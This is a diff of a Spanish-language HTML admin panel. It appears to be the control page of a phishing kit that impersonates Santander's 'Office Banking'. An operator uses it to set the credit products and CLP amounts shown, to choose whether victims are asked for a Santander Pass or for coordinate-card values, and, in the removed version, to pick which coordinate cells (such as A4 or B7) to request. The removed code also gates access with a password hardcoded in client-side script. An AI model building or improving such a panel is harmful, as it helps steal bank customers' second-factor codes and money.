@@ -4,127 +4,109 @@
   <meta charset="UTF-8">
   <title>Panel de Administración</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <!-- Ruta absoluta al CSS dentro de public -->
-  <link rel="stylesheet" href="/style.css">
+  <style>
+    body { font-family: Arial, sans-serif; margin: 20px; }
+    h2 { color: red; }
+    .campo { margin-bottom: 15px; }
+    label { display: block; font-weight: bold; margin-bottom: 5px; }
+    input, select { padding: 8px; width: 100%; }
+    button { background-color: red; color: white; padding: 10px 20px; border: none; cursor: pointer; font-weight: bold; }
+    #mensaje { margin-top: 20px; font-weight: bold; }
+  </style>
 </head>
 <body>
-  <script>
-    // Protección por clave simple
-    const clave = prompt("Ingrese clave de acceso:");
-    if(clave !== "Trabajo2101"){   // <-- aquí defines tu clave
-      alert("Acceso denegado");
-      window.location.href = "index.html"; // redirige al login
-    }
-  </script>
+  <h2>Panel de Administración</h2>
 
-  <div class="login-box">
-    <img src="/logo-officebanking.png" alt="Office Banking" class="logo">
+  <form id="configForm">
+    <div class="campo">
+      <label for="producto1">Producto 1</label>
+      <input type="text" id="producto1" name="producto1">
+      <label for="monto1">Monto Producto 1</label>
+      <input type="number" id="monto1" name="monto1">
+    </div>
 
-    <h2>Configurar Productos y Autorización</h2>
+    <div class="campo">
+      <label for="producto2">Producto 2</label>
+      <input type="text" id="producto2" name="producto2">
+      <label for="monto2">Monto Producto 2</label>
+      <input type="number" id="monto2" name="monto2">
+    </div>
 
-    <form id="adminForm">
-      <!-- Producto 1 -->
-      <label>
-        <input type="checkbox" id="enableProducto1"> Línea de Crédito
-      </label>
-      <input type="number" id="monto1" placeholder="Monto CLP">
+    <div class="campo">
+      <label for="producto3">Producto 3</label>
+      <input type="text" id="producto3" name="producto3" placeholder="Visualización de Tarjeta de Crédito">
+    </div>
 
-      <!-- Producto 2 -->
-      <label>
-        <input type="checkbox" id="enableProducto2"> Tarjeta de Crédito
-      </label>
-      <input type="number" id="monto2" placeholder="Monto CLP">
-
-      <!-- Producto 3 -->
-      <label>
-        <input type="checkbox" id="enableProducto3"> Visualización de Tarjeta
-      </label>
-      <!-- 👆 Sin campo de monto -->
-
-      <!-- Selección de tipo de autorización -->
+    <div class="campo">
       <label for="tipoAutorizacion">Tipo de Autorización</label>
-      <select id="tipoAutorizacion">
+      <select id="tipoAutorizacion" name="tipoAutorizacion">
         <option value="santander">Santander Pass</option>
         <option value="coordenadas">Coordenadas</option>
       </select>
+    </div>
 
-      <!-- Coordenadas configurables por el admin -->
-      <div id="coordConfig">
-        <label for="coord1">Coordenada 1 (ej: A4)</label>
-        <input type="text" id="coord1" maxlength="2" pattern="[A-Z][0-9]" placeholder="Ej: A4">
+    <div class="campo">
+      <label for="factibilidad">Factibilidad de Tarjeta</label>
+      <select id="factibilidad" name="factibilidad">
+        <option value="off">Deshabilitada</option>
+        <option value="on">Habilitada</option>
+      </select>
+    </div>
 
-        <label for="coord2">Coordenada 2 (ej: B7)</label>
-        <input type="text" id="coord2" maxlength="2" pattern="[A-Z][0-9]" placeholder="Ej: B7">
+    <button type="submit">Guardar Configuración</button>
+  </form>
 
-        <label for="coord3">Coordenada 3 (ej: C2)</label>
-        <input type="text" id="coord3" maxlength="2" pattern="[A-Z][0-9]" placeholder="Ej: C2">
-      </div>
-
-      <button class="btn-santander" type="submit">
-        Guardar<span class="bg-arrow"></span>
-      </button>
-    </form>
-
-    <div id="resultado"></div>
-  </div>
+  <div id="mensaje"></div>
 
   <script>
-    const API_URL = "https://autorizacion-ob.onrender.com/config";
-
     document.addEventListener("DOMContentLoaded", () => {
+      const API_URL = "/config";
+      const form = document.getElementById("configForm");
+      const mensaje = document.getElementById("mensaje");
+
+      // Cargar configuración actual
       fetch(API_URL)
         .then(res => res.json())
-        .then(data => {
-          // Cargar estado de productos
-          document.getElementById("enableProducto1").checked = !!data.producto1;
-          document.getElementById("monto1").value = data.monto1 || "";
-
-          document.getElementById("enableProducto2").checked = !!data.producto2;
-          document.getElementById("monto2").value = data.monto2 || "";
-
-          document.getElementById("enableProducto3").checked = !!data.producto3;
-
-          document.getElementById("tipoAutorizacion").value = data.tipoAutorizacion || "santander";
-          document.getElementById("coord1").value = data.coord1 || "";
-          document.getElementById("coord2").value = data.coord2 || "";
-          document.getElementById("coord3").value = data.coord3 || "";
+        .then(cfg => {
+          document.getElementById("producto1").value = cfg.producto1 || "";
+          document.getElementById("monto1").value = cfg.monto1 || "";
+          document.getElementById("producto2").value = cfg.producto2 || "";
+          document.getElementById("monto2").value = cfg.monto2 || "";
+          document.getElementById("producto3").value = cfg.producto3 || "";
+          document.getElementById("tipoAutorizacion").value = cfg.tipoAutorizacion || "santander";
+          document.getElementById("factibilidad").value = cfg.factibilidad || "off";
         })
         .catch(err => {
           console.error("Error al cargar configuración:", err);
-          document.getElementById("resultado").innerText = "⚠️ No se pudo cargar configuración del servidor.";
+          mensaje.innerText = "⚠️ No se pudo cargar configuración.";
         });
-    });
 
-    document.getElementById("adminForm").addEventListener("submit", function(e){
-      e.preventDefault();
+      // Guardar cambios
+      form.addEventListener("submit", e => {
+        e.preventDefault();
+        const data = {
+          producto1: document.getElementById("producto1").value,
+          monto1: parseInt(document.getElementById("monto1").value) || 0,
+          producto2: document.getElementById("producto2").value,
+          monto2: parseInt(document.getElementById("monto2").value) || 0,
+          producto3: document.getElementById("producto3").value,
+          tipoAutorizacion: document.getElementById("tipoAutorizacion").value,
+          factibilidad: document.getElementById("factibilidad").value
+        };
 
-      const config = {
-        producto1: document.getElementById("enableProducto1").checked ? "Línea de Crédito" : "",
-        monto1: document.getElementById("monto1").value,
-        producto2: document.getElementById("enableProducto2").checked ? "Tarjeta de Crédito" : "",
-        monto2: document.getElementById("monto2").value,
-        producto3: document.getElementById("enableProducto3").checked ? "Visualización de Tarjeta" : "",
-        tipoAutorizacion: document.getElementById("tipoAutorizacion").value,
-        coord1: document.getElementById("coord1").value.toUpperCase(),
-        coord2: document.getElementById("coord2").value.toUpperCase(),
-        coord3: document.getElementById("coord3").value.toUpperCase()
-      };
-
-      fetch(API_URL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(config)
-      })
-      .then(res => {
-        if(res.ok){
-          document.getElementById("resultado").innerText = "✅ Configuración actualizada correctamente.";
-        } else {
-          document.getElementById("resultado").innerText = "⚠️ Error al guardar configuración.";
-        }
-      })
-      .catch(err => {
-        console.error("Error al guardar configuración:", err);
-        document.getElementById("resultado").innerText = "⚠️ No se pudo conectar con el servidor.";
+        fetch(API_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(data)
+        })
+        .then(res => res.json())
+        .then(cfg => {
+          mensaje.innerText = "✅ Configuración guardada correctamente.";
+        })
+        .catch(err => {
+          console.error("Error al guardar configuración:", err);
+          mensaje.innerText = "❌ Error al guardar configuración.";
+        });
       });
     });
   </script>
